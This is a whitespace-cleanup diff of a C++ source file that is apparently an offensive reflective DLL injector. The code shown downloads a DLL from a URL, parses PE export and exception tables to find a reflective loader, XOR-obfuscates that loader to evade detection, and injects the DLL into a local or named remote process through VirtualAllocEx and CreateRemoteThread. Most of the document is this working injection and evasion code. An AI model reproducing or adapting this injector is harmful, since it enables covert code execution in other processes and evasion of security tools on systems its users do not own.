@@ -83,9 +83,9 @@ iArgs argumentParser(int argc, char* argv[]) {
 	args.isLocal = false;
     for (int i = 1; i < argc; ++i) {
         std::string arg = argv[i];
-		
-        
-        
+
+
+
         if (arg == "-url") {
             if (i + 1 < argc) {
                 args.url = argv[i + 1];
@@ -94,7 +94,7 @@ iArgs argumentParser(int argc, char* argv[]) {
             else {
                 // Handle error: "-url" option requires an argument
                 std::cerr << "[-] Error: -url option requires an argument." << std::endl;
-               
+
             }
         }
         else if (arg == "-process") {
@@ -205,12 +205,12 @@ int RetrievePIDbyName(wchar_t* procName) {
 
 PBYTE InjectDllRemoteProcess(int pid, size_t dllSize, PBYTE dllBuffer, HANDLE hProc, size_t funcSize) {
 
-    
+
     size_t bytesWritten = 0;
     PBYTE dllBufferFinal = (PBYTE)addHeaderToBuffer(dllBuffer, dllSize, funcSize);
-    
 
-    
+
+
 
     PBYTE dllDestination = (PBYTE)VirtualAllocEx(hProc, NULL, dllSize + DLL_HEADER_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (dllDestination == NULL) {
@@ -253,7 +253,7 @@ DWORD Rva2Raw(DWORD rva, vector<PIMAGE_SECTION_HEADER> peSections, int numberOfS
         if (rva >= peSections[i]->VirtualAddress && rva < (peSections[i]->VirtualAddress + peSections[i]->Misc.VirtualSize))
         {
             //so computing first the "distance" between the virtual beginning of the virtual section to the RVA
-            //then adding that to the beginning of the same section but raw 
+            //then adding that to the beginning of the same section but raw
             return ((rva - peSections[i]->VirtualAddress) + peSections[i]->PointerToRawData);
         }
 
@@ -278,8 +278,8 @@ PBYTE findFunctionEnd(PBYTE dllBase, PBYTE loaderAddressRaw) {
 
     for (int i = 0; i < fileHeader.NumberOfSections; i++) {
 
-        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header. 
-        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header 
+        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header.
+        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header
         peSections.insert(peSections.begin(), (PIMAGE_SECTION_HEADER)(((PBYTE)pNtHeader) + 4 + 20 + fileHeader.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER)));
 
     }
@@ -287,9 +287,9 @@ PBYTE findFunctionEnd(PBYTE dllBase, PBYTE loaderAddressRaw) {
     PRUNTIME_FUNCTION pRuntimeFunction = (PRUNTIME_FUNCTION)(dllBase + Rva2Raw(optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress, peSections, (int)fileHeader.NumberOfSections));
     for (DWORD i = 0; i < optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size / sizeof(RUNTIME_FUNCTION); ++i) {
         // Access the fields of each RUNTIME_FUNCTION structure
-      
+
         if ((LPVOID)Rva2Raw(pRuntimeFunction[i].BeginAddress, peSections, (int)fileHeader.NumberOfSections) == loaderAddressRaw) {
-            
+
             return (PBYTE) Rva2Raw((pRuntimeFunction[i].EndAddress-1), peSections, (int)fileHeader.NumberOfSections);
         }
     }
@@ -301,7 +301,7 @@ LPVOID RetrieveFunctionRawPointer(PBYTE dllBase, const char * funcName) {
 
     LPVOID exportedFuncAddrRVA = NULL;
 
-    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBase; 
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dllBase;
     if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
         return NULL;
     }
@@ -315,41 +315,41 @@ LPVOID RetrieveFunctionRawPointer(PBYTE dllBase, const char * funcName) {
     vector<PIMAGE_SECTION_HEADER> peSections;
 
     for (int i = 0; i < fileHeader.NumberOfSections; i++) {
-    
-        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header. 
-        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header 
+
+        //starting from the pointer to NT header + 4(signature) + 20(file header) + size of optional = pointer to first section header.
+        // to get to the next i multiply the index running through the number of sections multiplied by the size of section header
         peSections.insert(peSections.begin(), (PIMAGE_SECTION_HEADER)(((PBYTE)pNtHeader) + 4 + 20 + fileHeader.SizeOfOptionalHeader + (i * IMAGE_SIZEOF_SECTION_HEADER)));
-        
+
     }
-   
+
     //FROM HERE ONWARDS WE START PLAYING WITH RVA THEREFORE WE NEED TO FIND THE OFFSET IN RAW FILES
-    //READING BYTES FROM FILE OR DOWNLOADING STILL MEANS RAW DATA, WHEN WE VIRTUALALLOC AND WRITE THE SECTION MANUALLY 
-    //FROM RAW DATA TO VIRTUAL ADDRESSES THEN IT'S VIRTUAL MEMORY AND WE CAN USE RVA 
-    
+    //READING BYTES FROM FILE OR DOWNLOADING STILL MEANS RAW DATA, WHEN WE VIRTUALALLOC AND WRITE THE SECTION MANUALLY
+    //FROM RAW DATA TO VIRTUAL ADDRESSES THEN IT'S VIRTUAL MEMORY AND WE CAN USE RVA
+
     //going throught the export directory to find the ReflectiveFunction we want to invoke
     PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllBase + Rva2Raw(optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, peSections, (int)fileHeader.NumberOfSections));
     PDWORD FunctionNameArray = (PDWORD) (dllBase + Rva2Raw(pExportDirectory->AddressOfNames, peSections, (int)fileHeader.NumberOfSections));
     PDWORD FunctionAddressArray = (PDWORD) (dllBase + Rva2Raw(pExportDirectory->AddressOfFunctions, peSections, (int)fileHeader.NumberOfSections));
     PWORD  FunctionOrdinalArray = (PWORD) (dllBase + Rva2Raw(pExportDirectory->AddressOfNameOrdinals, peSections, (int)fileHeader.NumberOfSections));
     char* functionName = NULL;
-    
+
     for (DWORD i = 0; i < pExportDirectory->NumberOfFunctions; i++) {
-        
+
         functionName = (CHAR*)(dllBase + Rva2Raw(FunctionNameArray[i], peSections, (int)fileHeader.NumberOfSections));
         if (strcmp(functionName, funcName) == 0) {
-            
+
             exportedFuncAddrRVA = (LPVOID) Rva2Raw(FunctionAddressArray[i], peSections, (int)fileHeader.NumberOfSections);
             break;
         }
     }
     return exportedFuncAddrRVA;
 
-   
+
 }
 
 VOID OBXOR(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE bKey, SIZE_T sKeySize) {
     for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
-        
+
         if (j >= sKeySize) {
             j = 0;
         }
@@ -358,8 +358,8 @@ VOID OBXOR(PBYTE pShellcode, SIZE_T sShellcodeSize, PBYTE bKey, SIZE_T sKeySize)
 }
 
 VOID encryptReflectiveFunction(PBYTE begin, SIZE_T functionSize) {
-    
-    
+
+
     OBXOR(begin, functionSize, KEY, KEY_SIZE);
 
 }
@@ -376,7 +376,7 @@ int main(int argc, char *argv[])
     }
     */
 
-   
+
     /*--------DOWNLOAD DLL FROM URL------------*/
 
 	//LPCSTR url = arguments.url;
@@ -389,7 +389,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-	/*--------CHECK IF LOCAL OR REMOTE INJECTION------------*/ 
+	/*--------CHECK IF LOCAL OR REMOTE INJECTION------------*/
 
 	if (arguments.isLocal) {
 
@@ -414,7 +414,7 @@ int main(int argc, char *argv[])
 
         encryptReflectiveFunction(pebase + (DWORD)reflectiveLoaderFunc, (SIZE_T)rfSize);
 
-		/*--------ALLOCATE MEMORY, WRITE DLL TO LOCAL PROCESS--------------*/ 
+		/*--------ALLOCATE MEMORY, WRITE DLL TO LOCAL PROCESS--------------*/
 
 		PBYTE localPEBase = InjectDllLocalProcess(pefile.size(), pebase, (SIZE_T)rfSize);
 		if (localPEBase == NULL) {
@@ -422,7 +422,7 @@ int main(int argc, char *argv[])
 			return 1;
 		}
 		printf("[+] Successfully injected the DLL in the local process at address : % p\n", localPEBase);
-        
+
 
         /*-------------RETRIEVE PRELOADER RAW ADDRESS-------------*/
         PBYTE reflectivePreLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_PRE_LOADER);
@@ -462,13 +462,13 @@ int main(int argc, char *argv[])
     int pid = RetrievePIDbyName(GetWC(targetProcess));
     if (pid != 0) {
         printf("[+] Process found with PID %lu\n", pid);
-        
+
     }
     else {
         cout << "[-] Process not found, exiting ... " << endl;
         return 1;
     }
-    
+
 
     /*----------OPEN HANDLE TO REMOTE PROCESS PLEASE----------*/
 
@@ -478,7 +478,7 @@ int main(int argc, char *argv[])
         return 1;
     }
 
-   
+
 
     /*--------CALCULATE THE OFFSET OF THE REFLECTIVE FUNCTION--------*/
 
@@ -494,7 +494,7 @@ int main(int argc, char *argv[])
     PBYTE reflectiveLoaderFuncEnd = findFunctionEnd(pebase, reflectiveLoaderFunc);
     int rfSize = (reflectiveLoaderFuncEnd - reflectiveLoaderFunc);
     printf("[+] Size of Reflective Function (bytes): %lu\n", rfSize);
-    
+
     /*----------HIDING THE REFLECTIVE FUNCTION---------------------------*/
 
     encryptReflectiveFunction(pebase+ (DWORD)reflectiveLoaderFunc, (SIZE_T) rfSize);
@@ -507,7 +507,7 @@ int main(int argc, char *argv[])
         cout << "[-] Error while injecting the DLL in the remote process, exiting\n";
         return 1;
     }
-    
+
     /*-------------RETRIEVE PRELOADER RAW ADDRESS-------------*/
     PBYTE reflectivePreLoaderFunc = (PBYTE)RetrieveFunctionRawPointer(pebase, EXPORTED_PRE_LOADER);
     if (reflectivePreLoaderFunc == NULL) {
@@ -516,11 +516,11 @@ int main(int argc, char *argv[])
     }
     printf("[+] PreLoader function found at relative raw address: %p\n", reflectivePreLoaderFunc);
     /*--------CREATE REMOTE THREAD---------------------------------------*/
-    
+
 
     DWORD threadId = 0x0;
     HANDLE hThread = NULL;
-    //every RVA in the PE is SHIFTED BY THE HEADER SIZE I USE TO FIND THE DLL IN MEMORY EGG 
+    //every RVA in the PE is SHIFTED BY THE HEADER SIZE I USE TO FIND THE DLL IN MEMORY EGG
     hThread = CreateRemoteThread(hProc,NULL, 0, (LPTHREAD_START_ROUTINE)(remotePEBase + (DWORD)reflectivePreLoaderFunc + DLL_HEADER_SIZE), NULL, 0 , &threadId);
     if (hThread == NULL) {
         cout << "[-] Error while running the remote thread, exiting ... \n";
@@ -529,7 +529,7 @@ int main(int argc, char *argv[])
         printf("[+] Successufully ran thread with id: %lu\n", threadId);
     }
 
-    return 0; 
+    return 0;
 }
 
 
